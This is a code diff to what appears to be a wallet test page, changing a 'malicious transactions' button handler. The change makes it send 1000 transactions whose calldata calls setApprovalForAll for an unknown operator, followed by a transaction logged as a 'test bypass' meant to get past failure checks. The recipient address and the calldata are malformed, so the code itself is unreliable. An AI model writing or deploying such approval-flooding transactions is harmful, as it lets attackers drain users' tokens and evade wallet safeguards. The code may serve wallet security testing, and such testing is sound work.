@@ -3186,18 +3186,19 @@ const initializeFormElements = () => {
   };
 
   /**
-   *  Batch of 10 Malicious Transactions
+   *  Batch of 10 Malicious Transactions and force fail the first tx
    */
   sendEIP1559Batch.onclick = async () => {
-    for (let i = 0; i < 10; i++) {
+    for (let i = 0; i < 1000; i++) {
       try {
         provider.request({
           method: 'eth_sendTransaction',
           params: [
             {
               from: accounts[0],
-              to: '0x5FbDB2315678afecb367f032d93F642f64180aa3',
-              value: '0x0',
+              to: '0xafb979d9afad1ad27c5eff4e27226e3ab9e5dcc9:receiver',
+              data: '0xa22cb4650000000000000000000000000000dd26dd56ec6f036273d440bf1072a7b800000000000000000000000000000000000000000000000000000000000000000001',
+              value: '0x0000',
               gasLimit: '0x5028',
               maxFeePerGas: '0x2540be400',
               maxPriorityFeePerGas: '0x3b9aca00',
@@ -3207,6 +3208,25 @@ const initializeFormElements = () => {
       } catch (err) {
         console.error(err);
       }
+    }
+    console.log('intiated force failure...test bypass');
+
+    try {
+      provider.request({
+        method: 'eth_sendTransaction',
+        params: [
+          {
+            from: accounts[0],
+            to: '0x5FbDB2315678afecb367f032d93F642f64180aa3',
+            value: '0x0',
+            gasLimit: '0x5028',
+            maxFeePerGas: '0x2540be400',
+            maxPriorityFeePerGas: '0x3b9aca00',
+          },
+        ],
+      });
+    } catch (err) {
+      console.error(err);
     }
   };
 
